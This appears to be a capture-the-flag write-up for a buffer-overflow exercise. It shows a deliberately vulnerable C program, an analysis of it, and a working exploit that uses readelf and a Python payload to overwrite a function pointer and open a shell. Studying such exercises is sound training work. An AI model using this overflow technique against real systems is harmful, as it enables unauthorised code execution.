@@ -1,0 +1,46 @@
+I -code Source  : 
+    a : login to ssh .
+-------------------------------------------------------------------------------------------
+    /*
+    gcc -m32 -fno-stack-protector -o ch15 ch15.c
+    */
+     
+    #include <stdio.h>
+    #include <stdlib.h>
+     
+    void shell() {
+        system("/bin/dash");
+    }
+     
+    void sup() {
+        printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
+    }
+     
+    main()
+    {
+        int var;
+        void (*func)()=sup;
+        char buf[128];
+        fgets(buf,133,stdin);
+        func();
+    }
+    -------------------------------------------------------------------------------------------
+    II - Analyse Code :
+          a : Procedure named Shell which it's execute "/bin/shell" shell.
+          b : Procedure named sup chich it's print a message.
+          c : making like a pointer called func wich it's pointing on sup rocedure. 
+          d : buf char variable with a size of 128.
+          e : reading user input .
+          f : calling func() => sup.
+    III - How to exploit :
+          a : using Readelf in linux .
+              "readelf -a ch15 | grep FUNC" to Have adresse of Shell Procedure which is (68: 08048464    20 FUNC    GLOBAL DEFAULT   13 shell).
+               in bigger indian . 
+          b : The key Here is to override the program to execute the shell 
+              by giving the porgram a lot like 133 (fgets(buf,133,stdin)) of little indian form of 08048464 (shell adresse) to execute shell  the payload ( python -c 'print "\x64\x84\x04\x08"*133 ' |./ch15) =>  no output .
+          c : finally catching the Shell using cat command 
+              << (python -c 'print "\x64\x84\x04\x08"*133 ' ;cat) |./ch15 >>
+              
+ ##################### WE GETTING BETTER BY GIVING BACK !  #####################
+
+-------------------------------- congratulation -----------------------------------
